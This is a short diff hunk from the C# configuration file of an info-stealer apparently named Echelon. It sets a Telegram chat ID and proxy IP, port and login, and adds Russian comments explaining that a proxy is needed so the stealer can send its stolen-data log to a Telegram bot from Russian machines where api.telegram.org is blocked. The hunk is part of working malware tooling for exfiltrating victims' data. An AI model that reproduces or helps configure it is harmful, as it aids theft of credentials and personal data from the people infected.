@@ -25,6 +25,8 @@ namespace Echelon
         public static string ID = "824301566";
 
         // Настроки Proxy, поддерживает только proxy http/s с поддержкой POST запросов, socks's не поддерживает!
+        // Proxy обязателен если стиллер был запущен на RU пк или с пк с которого нету доступа к сайту: api.telegram.org
+        // В RU api.telegram.org заблокирован роскомнадзором! И стилер не сможет отправить лог в бота.
         public static string ip ="1.1.1.1"; // IP Proxy
         public static int port = 4239; // Порт Proxy
         public static string login = "USER"; // Логин Proxy
